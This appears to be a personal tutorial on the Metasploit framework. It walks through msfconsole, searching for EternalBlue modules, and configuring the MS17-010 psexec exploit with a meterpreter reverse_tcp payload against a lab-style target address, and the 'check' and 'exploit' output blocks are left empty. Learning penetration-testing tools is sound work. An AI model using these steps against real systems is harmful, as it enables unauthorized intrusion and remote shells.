# Metasploit

Metasploit is a collection of vulnerability scanners, exploit scripts, and
post-exploit tooling such as Meterpreter - a deployable command & control
application for getting remote shells, proxies, etc from the perspective of an
exploited machine.


## Running metasploit

Metasploit is initially started through the msfconsole command:

```
┌─[✗]─[shaunkeys@parrot]─[~]
└──╼ $msfconsole
Metasploit tip: Execute a command across all sessions with sessions -C
<command>


 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.4.111-dev                               ]
+ -- --=[ 2,607 exploits - 1,323 auxiliary - 1,707 payloads     ]
+ -- --=[ 429 post - 49 encoders - 14 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

[msf](Jobs:0 Agents:0) >>
```


## Getting help

Metasploit has built-in help pages for navigating & using their commands. To
get help for a command, just type `help <command>`. For example, `help search`
yields the following results:

```
[msf](Jobs:0 Agents:0) >> help search
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.


OPTIONS:

    -h, --help                      Help banner
    -I, --ignore                    Ignore the command if the only match has the same name as the search
    -o, --output <filename>         Send output to a file in csv format
    -r, --sort-descending <column>  Reverse the order of search results to descending order
    -S, --filter <filter>           Regex pattern used to filter search results
    -s, --sort-ascending <column>   Sort search results by the specified column in ascending order
    -u, --use                       Use module if there is one result

Keywords:
  action           :  Modules with a matching action name or description
  adapter          :  Modules with a matching adapter reference name
  aka              :  Modules with a matching AKA (also-known-as) name
  arch             :  Modules affecting this architecture
  att&ck           :  Modules with a matching MITRE ATT&CK ID or reference
  author           :  Modules written by this author
  bid              :  Modules with a matching Bugtraq ID
  check            :  Modules that support the 'check' method
  cve              :  Modules with a matching CVE ID
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  edb              :  Modules with a matching Exploit-DB ID
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  osvdb            :  Modules with a matching OSVDB ID
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  session_type     :  Modules with a matching session type (SMB, MySQL, Meterpreter, etc)
  stage            :  Modules with a matching stage reference name
  stager           :  Modules with a matching stager reference name
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitability rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method
  action           :  Sort modules by whether or not they have actions

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
  search att&ck:T1059
```


## Searching exploits

Metasploit's exploit database can be searched using the `search exploit`
command:

```
[msf](Jobs:0 Agents:0) >> search exploit eternalblue
]
Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   25    \_ target: Execute payload (x64)             .                .        .      .
   26    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 26, use 26 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```


## Using an exploit

Start by running the `use` command, followed by the exploit you would like to
use:

```
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >>
```

Next, we need to configure the options. Use the `show options` command to list
out the valid options for this exploit module:

```
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.122.76   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

Next, set some options for the module:

```
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST tun0
LHOST => <redacted>
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >>
```

Now you can use the `check` command to see if the host is vulnerable:

```
```

Note: Not all modules support the `check` command.

Run the `exploit` command to exploit the host and get a reverse shell:

```
```
